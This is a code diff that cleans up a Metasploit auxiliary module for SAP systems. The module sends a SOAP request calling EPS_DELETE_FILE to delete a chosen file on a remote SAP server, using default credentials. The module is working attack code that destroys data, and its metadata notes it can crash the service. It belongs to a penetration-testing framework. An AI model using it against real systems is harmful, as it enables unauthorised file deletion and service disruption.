@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -20,8 +20,6 @@
 # just seem to enjoy hacking SAP :)
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -38,15 +36,19 @@ class MetasploitModule < Msf::Auxiliary
       'References' => [
         [ 'OSVDB', '74780' ],
         [ 'URL', 'http://dsecrg.com/pages/vul/show.php?id=331' ],
-        [ 'URL', 'https://service.sap.com/sap/support/notes/1554030' ]
+        [ 'URL', 'https://launchpad.support.sap.com/#/notes/1554030' ]
       ],
-      'Author' =>
-        [
-          'Alexey Sintsov', # Vulnerability discovery
-          'nmonkee' # Metasploit module
-        ],
-      'License' => MSF_LICENSE
-      )
+      'Author' => [
+        'Alexey Sintsov', # Vulnerability discovery
+        'nmonkee' # Metasploit module
+      ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SERVICE_DOWN],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
+    )
 
     register_options([
       Opt::RPORT(8000),
@@ -55,10 +57,10 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('HttpPassword', [true, 'Password', '06071992']),
       OptString.new('DIRNAME', [true, 'Directory Path which contains the file to delete', '/tmp']),
       OptString.new('FILENAME', [true, 'Filename to delete', 'msf.txt'])
-    ], self.class)
+    ])
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     data = '<?xml version="1.0" encoding="utf-8" ?>'
     data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
     data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
@@ -84,7 +86,7 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
         },
         'vars_get' => {
           'sap-client' => datastore['CLIENT'],
@@ -92,16 +94,16 @@ class MetasploitModule < Msf::Auxiliary
         }
       })
 
-      if res and res.code == 200 and res.body =~ /EPS_DELETE_FILE.Response/ and res.body.include?(datastore['FILENAME']) and res.body.include?(datastore['DIRNAME'])
+      if res && (res.code == 200) && res.body =~ (/EPS_DELETE_FILE.Response/) && res.body.include?(datastore['FILENAME']) && res.body.include?(datastore['DIRNAME'])
         print_good("#{rhost}:#{rport} - File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted")
       elsif res
         vprint_error("#{rhost}:#{rport} - Response code: " + res.code.to_s)
         vprint_error("#{rhost}:#{rport} - Response message: " + res.message.to_s)
         vprint_error("#{rhost}:#{rport} - Response body: " + res.body.to_s) if res.body
       end
-      rescue ::Rex::ConnectionError
-        print_error("#{rhost}:#{rport} - Unable to connect")
-        return
-      end
+    rescue ::Rex::ConnectionError
+      print_error("#{rhost}:#{rport} - Unable to connect")
+      return
     end
   end
+end
